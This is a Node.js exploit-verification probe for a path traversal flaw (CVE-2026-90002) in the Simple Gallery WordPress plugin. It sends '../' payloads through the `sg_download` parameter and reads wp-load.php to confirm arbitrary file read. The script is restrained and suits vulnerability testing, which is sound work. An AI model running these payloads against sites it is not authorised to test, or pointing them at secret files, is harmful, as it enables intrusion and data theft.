#!/usr/bin/env node
/**
 * Exploit-verification probe for CVE-2026-90002
 * Simple Gallery <= 2.0.0 - Unauthenticated Path Traversal to Arbitrary File Read
 * via the `sg_download` parameter.
 *
 * Usage: node probe.mjs <base-url>
 * Exit code 0 => target IS vulnerable (path traversal succeeded)
 * Exit code 1 => target is NOT vulnerable (appears patched / unreachable)
 *
 * This probe only talks to the provided base URL. It reads a known,
 * non-sensitive WordPress core file (wp-load.php) via path traversal as
 * proof of arbitrary file read, rather than fetching wp-config.php, to
 * avoid unnecessarily exfiltrating secrets. It does not write any files
 * or persist any state on the target, so there is nothing to restore.
 */

const baseUrlArg = process.argv[2];

if (!baseUrlArg) {
	console.error('Usage: node probe.mjs <base-url>');
	process.exit(1);
}

let base;
try {
	base = new URL(baseUrlArg);
} catch (e) {
	console.error(`Invalid base URL: ${baseUrlArg}`);
	process.exit(1);
}

// Known-benign WordPress core file marker (not a secret) that proves
// arbitrary file read outside the gallery's upload directory.
const MARKER = 'Bootstrap file for setting the ABSPATH constant';

// A couple of traversal depths / targets to be robust against slightly
// different upload directory layouts (standard WP layout needs 3 levels
// of "../" to escape wp-content/uploads/simple-gallery/ back to webroot).
const payloads = [
	'../../../wp-load.php',
	'../../../../wp-load.php',
	'../../wp-load.php',
];

async function tryPayload(payload) {
	const url = new URL(base.toString());
	// Build query manually to avoid encoding the traversal dots in a way
	// that breaks the attack (we want literal ../ sent to the server).
	const qs = `sg_download=${payload}`;
	url.search = url.search ? `${url.search}&${qs}` : `?${qs}`;

	let res;
	try {
		res = await fetch(url.toString(), { method: 'GET', redirect: 'manual' });
	} catch (e) {
		return { ok: false, reason: `request failed: ${e.message}` };
	}

	if (res.status !== 200) {
		return { ok: false, reason: `unexpected status ${res.status}` };
	}

	const body = await res.text();
	if (body.includes(MARKER)) {
		return { ok: true, reason: `traversal via "${payload}" returned core file contents` };
	}
	return { ok: false, reason: `response did not contain expected marker` };
}

async function main() {
	for (const payload of payloads) {
		const result = await tryPayload(payload);
		if (result.ok) {
			console.log(`VULNERABLE: ${result.reason}`);
			// Nothing persistent was changed on the target; no cleanup needed.
			process.exit(0);
		} else {
			console.error(`probe attempt failed (${payload}): ${result.reason}`);
		}
	}

	console.log('NOT VULNERABLE: path traversal via sg_download did not succeed.');
	process.exit(1);
}

main().catch((e) => {
	console.error(`Unexpected error: ${e && e.stack ? e.stack : e}`);
	process.exit(1);
});
